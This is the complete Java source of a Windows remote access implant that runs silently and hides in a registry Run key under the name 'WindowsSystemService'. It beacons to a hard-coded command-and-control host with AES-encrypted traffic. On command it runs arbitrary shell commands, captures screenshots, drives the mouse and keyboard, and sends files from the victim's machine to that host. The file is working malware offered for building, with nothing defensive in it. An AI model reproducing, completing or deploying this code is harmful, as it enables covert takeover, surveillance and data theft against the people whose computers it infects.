// implant-java/Main.java  —  Java 11+, no external deps, Windows target
// Build: javac Main.java && jar cfe implant.jar Main Main.class
// Run:   javaw -jar implant.jar   (silent, no console)

import java.awt.*;
import java.awt.event.*;
import java.awt.image.*;
import java.io.*;
import java.net.*;
import java.nio.channels.*;
import java.nio.charset.*;
import java.nio.file.*;
import java.security.*;
import java.util.*;
import javax.crypto.*;
import javax.crypto.spec.*;
import javax.imageio.*;

public class Main {

    // ── Config — edit before building ───────────────────────────────────────
    static final String  HOST            = "six7spy.onrender.com";
    static final int     PORT            = 443;
    static final boolean USE_TLS         = true;
    static final String  MASTER_AES_HEX  = "d634fc26c4bdcdc9cc8cf85dee10c7b3721553977cf68cec96078f094671b1b6";
    static final String  MASTER_HMAC_HEX = "3eb8b23d5938e78c73f82631a6e697eaeff88d0b7f2cbfa7cc69455d5553d054";
    static final int     BEACON_MS       = 5000;
    static final int     JITTER_MS       = 2000;
    // ────────────────────────────────────────────────────────────────────────

    static volatile int beaconInterval = BEACON_MS;
    static byte[] masterAes, masterHmac;
    static byte[] perAes, perHmac;
    static String uuid;
    static String selfPath;
    static final Random RNG = new Random();

    // ── Entry ────────────────────────────────────────────────────────────────
    public static void main(String[] args) {
        try {
            if (!singleInstance()) return;
            selfPath   = getSelfPath();
            masterAes  = hexToBytes(MASTER_AES_HEX);
            masterHmac = hexToBytes(MASTER_HMAC_HEX);
            register();
            installPersistence();
            beaconLoop();
        } catch (Exception ignored) {}
    }

    // ── Single instance — file lock in temp dir ──────────────────────────────
    static FileLock instanceLock;
    static boolean singleInstance() {
        try {
            File lock = new File(System.getProperty("java.io.tmpdir"), "67s_lock");
            @SuppressWarnings("resource")
            FileChannel ch = new RandomAccessFile(lock, "rw").getChannel();
            instanceLock = ch.tryLock();
            return instanceLock != null;
        } catch (Exception e) { return false; }
    }

    // ── Self path ────────────────────────────────────────────────────────────
    static String getSelfPath() {
        try {
            return new File(Main.class.getProtectionDomain()
                .getCodeSource().getLocation().toURI()).getAbsolutePath();
        } catch (Exception e) { return ""; }
    }

    // ── Persistence — HKCU Run key ───────────────────────────────────────────
    static void installPersistence() {
        if (selfPath == null || selfPath.isEmpty()) return;
        try {
            String cmd = "reg add "
                + "\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
                + "/v WindowsSystemService /t REG_SZ "
                + "/d \"javaw.exe -jar \\\"" + selfPath + "\\\"\" /f";
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", cmd});
        } catch (Exception ignored) {}
    }

    static void removePersistence() {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C",
                "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\""
                + " /v WindowsSystemService /f"});
        } catch (Exception ignored) {}
    }

    // ── Registration ─────────────────────────────────────────────────────────
    static void register() throws Exception {
        uuid = UUID.randomUUID().toString();
        String hostname = "unknown", username = "unknown", osInfo = "unknown";
        try { hostname = InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
        try { username = System.getProperty("user.name", "unknown"); } catch (Exception ignored) {}
        try { osInfo = System.getProperty("os.name","?") + " " + System.getProperty("os.version","?"); } catch (Exception ignored) {}

        String payload = "{\"uuid\":\"" + uuid + "\",\"ver\":\"1\","
            + "\"hostname\":\"" + escJson(hostname) + "\","
            + "\"username\":\"" + escJson(username) + "\","
            + "\"os_info\":\"" + escJson(osInfo) + "\"}";

        byte[] plain  = payload.getBytes(StandardCharsets.UTF_8);
        byte[] enc    = aesEncrypt(masterAes, plain);
        byte[] sigRaw = hmacSha256(masterHmac, enc);
        String body   = Base64.getEncoder().encodeToString(enc) + "\n" + bytesToHex(sigRaw);

        byte[] resp = httpPost("/reg", body.getBytes(StandardCharsets.UTF_8), "text/plain");
        if (resp == null) throw new Exception("reg failed");

        // Response is base64(nonce+ct) encrypted with master AES
        byte[] encResp = Base64.getDecoder().decode(resp);
        byte[] plainResp = aesDecrypt(masterAes, encResp);
        if (plainResp == null) throw new Exception("reg decrypt failed");

        // Parse {"per_aes":"<hex>","per_hmac":"<hex>"}
        String json = new String(plainResp, StandardCharsets.UTF_8);
        perAes  = hexToBytes(jsonValue(json, "per_aes"));
        perHmac = hexToBytes(jsonValue(json, "per_hmac"));
    }

    // ── Beacon loop ───────────────────────────────────────────────────────────
    static void beaconLoop() {
        while (true) {
            try {
                String task = pollTask();
                if (task != null && !task.trim().isEmpty()) handleTask(task);
            } catch (Exception ignored) {}
            try {
                int jitter = RNG.nextInt(JITTER_MS * 2) - JITTER_MS;
                Thread.sleep(Math.max(500, beaconInterval + jitter));
            } catch (InterruptedException ignored) {}
        }
    }

    // ── Task poll ─────────────────────────────────────────────────────────────
    static String pollTask() throws Exception {
        long ts = System.currentTimeMillis() / 1000L;
        String tsStr = String.valueOf(ts);
        byte[] sigData = (uuid + tsStr).getBytes(StandardCharsets.UTF_8);
        String sig = bytesToHex(hmacSha256(perHmac, sigData));
        String path = "/task?id=" + uuid + "&sig=" + sig + "&ts=" + tsStr;
        byte[] resp = httpGet(path);
        if (resp == null || resp.length == 0) return null;
        // Response is base64(nonce+ct)
        byte[] enc = Base64.getDecoder().decode(resp);
        byte[] plain = aesDecrypt(perAes, enc);
        if (plain == null) return null;
        return new String(plain, StandardCharsets.UTF_8);
    }

    // ── Task dispatch ─────────────────────────────────────────────────────────
    static void handleTask(String taskJson) {
        try {
            String type = jsonValue(taskJson, "type");
            String result;
            String rtype = "shell";
            switch (type) {
                case "shell":
                    result = runShell(jsonValue(taskJson, "cmd"));
                    break;
                case "screenshot":
                    doScreenshot();
                    return;
                case "mousemove":
                    doMouseMove(intVal(taskJson, "x"), intVal(taskJson, "y"));
                    result = "ok";
                    break;
                case "lclick":
                    doClick(intVal(taskJson, "x"), intVal(taskJson, "y"), InputEvent.BUTTON1_DOWN_MASK);
                    result = "ok";
                    break;
                case "rclick":
                    doClick(intVal(taskJson, "x"), intVal(taskJson, "y"), InputEvent.BUTTON3_DOWN_MASK);
                    result = "ok";
                    break;
                case "dblclick":
                    doDblClick(intVal(taskJson, "x"), intVal(taskJson, "y"));
                    result = "ok";
                    break;
                case "keypress":
                    doKeyPress(intVal(taskJson, "vk"));
                    result = "ok";
                    break;
                case "typetext":
                    doTypeText(jsonValue(taskJson, "text"));
                    result = "ok";
                    break;
                case "upload":
                    doUpload(jsonValue(taskJson, "path"), jsonValue(taskJson, "name"));
                    return;
                case "sleep":
                    beaconInterval = intVal(taskJson, "ms");
                    result = "ok";
                    break;
                case "die":
                    removePersistence();
                    System.exit(0);
                    return;
                default:
                    result = "unknown task: " + type;
            }
            sendResult(result, rtype);
        } catch (Exception e) {
            try { sendResult("error: " + e.getMessage(), "shell"); } catch (Exception ignored) {}
        }
    }

    // ── Shell ─────────────────────────────────────────────────────────────────
    static String runShell(String cmd) {
        if (cmd == null || cmd.isEmpty()) return "";
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/C", cmd});
            byte[] out = p.getInputStream().readAllBytes();
            byte[] err = p.getErrorStream().readAllBytes();
            p.waitFor();
            String s = new String(out, "Cp850");
            if (err.length > 0) s += "\n[stderr]\n" + new String(err, "Cp850");
            return s;
        } catch (Exception e) { return "error: " + e.getMessage(); }
    }

    // ── Screenshot ────────────────────────────────────────────────────────────
    static void doScreenshot() throws Exception {
        Robot robot = new Robot();
        Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        BufferedImage img = robot.createScreenCapture(screen);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ImageIO.write(img, "png", baos);
        sendUploadBytes(baos.toByteArray(), "screenshot.png");
    }

    // ── Mouse & keyboard ──────────────────────────────────────────────────────
    static void doMouseMove(int x, int y) throws Exception {
        new Robot().mouseMove(x, y);
    }
    static void doClick(int x, int y, int btn) throws Exception {
        Robot r = new Robot();
        r.mouseMove(x, y);
        r.mousePress(btn);
        r.mouseRelease(btn);
    }
    static void doDblClick(int x, int y) throws Exception {
        Robot r = new Robot();
        r.mouseMove(x, y);
        r.mousePress(InputEvent.BUTTON1_DOWN_MASK);
        r.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
        r.delay(50);
        r.mousePress(InputEvent.BUTTON1_DOWN_MASK);
        r.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
    }
    static void doKeyPress(int vk) throws Exception {
        Robot r = new Robot();
        r.keyPress(vk);
        r.keyRelease(vk);
    }
    static void doTypeText(String text) throws Exception {
        if (text == null || text.isEmpty()) return;
        Robot r = new Robot();
        for (char c : text.toCharArray()) {
            int code = KeyEvent.getExtendedKeyCodeForChar(c);
            if (code != KeyEvent.VK_UNDEFINED) {
                r.keyPress(code);
                r.keyRelease(code);
                r.delay(20);
            }
        }
    }

    // ── File upload ───────────────────────────────────────────────────────────
    static void doUpload(String path, String name) throws Exception {
        if (path == null || path.isEmpty()) return;
        byte[] data = Files.readAllBytes(Paths.get(path));
        String fname = (name != null && !name.isEmpty()) ? name : Paths.get(path).getFileName().toString();
        sendUploadBytes(data, fname);
    }

    static void sendUploadBytes(byte[] data, String filename) throws Exception {
        byte[] enc    = aesEncrypt(perAes, data);
        byte[] sigRaw = hmacSha256(perHmac, enc);
        String sigHex = bytesToHex(sigRaw);
        String b64    = Base64.getEncoder().encodeToString(enc);
        String body   = "{\"sig\":\"" + sigHex + "\",\"data\":\"" + b64 + "\"}";
        String enc_fn = URLEncoder.encode(filename, "UTF-8");
        httpPost("/upload/" + uuid + "/" + enc_fn,
            body.getBytes(StandardCharsets.UTF_8), "application/json");
    }

    // ── Send result ───────────────────────────────────────────────────────────
    static void sendResult(String output, String rtype) throws Exception {
        byte[] plain  = output.getBytes(StandardCharsets.UTF_8);
        byte[] enc    = aesEncrypt(perAes, plain);
        byte[] sigRaw = hmacSha256(perHmac, enc);
        String sigHex = bytesToHex(sigRaw);
        String b64    = Base64.getEncoder().encodeToString(enc);
        String body   = "{\"id\":\"" + uuid + "\",\"sig\":\"" + sigHex
            + "\",\"data\":\"" + b64 + "\",\"rtype\":\"" + rtype + "\"}";
        httpPost("/result", body.getBytes(StandardCharsets.UTF_8), "application/json");
    }

    // ── HTTP helpers ──────────────────────────────────────────────────────────
    static byte[] httpGet(String path) throws Exception {
        URL url = new URL((USE_TLS ? "https" : "http") + "://" + HOST + ":" + PORT + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("GET");
        c.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        c.setConnectTimeout(10000);
        c.setReadTimeout(15000);
        int status = c.getResponseCode();
        if (status == 204 || status < 200 || status >= 300) return null;
        return c.getInputStream().readAllBytes();
    }

    static byte[] httpPost(String path, byte[] body, String ct) throws Exception {
        URL url = new URL((USE_TLS ? "https" : "http") + "://" + HOST + ":" + PORT + path);
        HttpURLConnection c = (HttpURLConnection) url.openConnection();
        c.setRequestMethod("POST");
        c.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
        c.setRequestProperty("Content-Type", ct);
        c.setDoOutput(true);
        c.setConnectTimeout(10000);
        c.setReadTimeout(15000);
        c.getOutputStream().write(body);
        int status = c.getResponseCode();
        if (status < 200 || status >= 300) return null;
        return c.getInputStream().readAllBytes();
    }

    // ── Crypto ────────────────────────────────────────────────────────────────
    // AES-256-GCM — 12-byte nonce prepended
    static byte[] aesEncrypt(byte[] key, byte[] plain) throws Exception {
        byte[] nonce = new byte[12];
        new SecureRandom().nextBytes(nonce);
        SecretKeySpec sk = new SecretKeySpec(key, "AES");
        Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
        c.init(Cipher.ENCRYPT_MODE, sk, new GCMParameterSpec(128, nonce));
        byte[] ct = c.doFinal(plain);
        byte[] out = new byte[12 + ct.length];
        System.arraycopy(nonce, 0, out, 0, 12);
        System.arraycopy(ct, 0, out, 12, ct.length);
        return out;
    }

    static byte[] aesDecrypt(byte[] key, byte[] enc) {
        try {
            if (enc.length < 12) return null;
            byte[] nonce = Arrays.copyOfRange(enc, 0, 12);
            byte[] ct    = Arrays.copyOfRange(enc, 12, enc.length);
            SecretKeySpec sk = new SecretKeySpec(key, "AES");
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.DECRYPT_MODE, sk, new GCMParameterSpec(128, nonce));
            return c.doFinal(ct);
        } catch (Exception e) { return null; }
    }

    // HMAC-SHA256
    static byte[] hmacSha256(byte[] key, byte[] data) throws Exception {
        Mac mac = Mac.getInstance("HmacSHA256");
        mac.init(new SecretKeySpec(key, "HmacSHA256"));
        return mac.doFinal(data);
    }

    // ── Util ──────────────────────────────────────────────────────────────────
    static byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] out = new byte[len / 2];
        for (int i = 0; i < len; i += 2)
            out[i/2] = (byte) Integer.parseInt(hex.substring(i, i+2), 16);
        return out;
    }

    static String bytesToHex(byte[] b) {
        StringBuilder sb = new StringBuilder(b.length * 2);
        for (byte x : b) sb.append(String.format("%02x", x));
        return sb.toString();
    }

    // Minimal JSON value extractor — handles string and number values
    static String jsonValue(String json, String key) {
        String needle = "\"" + key + "\"";
        int ki = json.indexOf(needle);
        if (ki < 0) return "";
        int colon = json.indexOf(':', ki + needle.length());
        if (colon < 0) return "";
        int start = colon + 1;
        while (start < json.length() && json.charAt(start) == ' ') start++;
        if (start >= json.length()) return "";
        if (json.charAt(start) == '"') {
            int end = json.indexOf('"', start + 1);
            return end < 0 ? "" : json.substring(start + 1, end);
        }
        // number or bare value
        int end = start;
        while (end < json.length() && ",}".indexOf(json.charAt(end)) < 0) end++;
        return json.substring(start, end).trim();
    }

    static int intVal(String json, String key) {
        try { return Integer.parseInt(jsonValue(json, key)); }
        catch (Exception e) { return 0; }
    }

    static String escJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"")
                .replace("\n", "\\n").replace("\r", "\\r");
    }
}
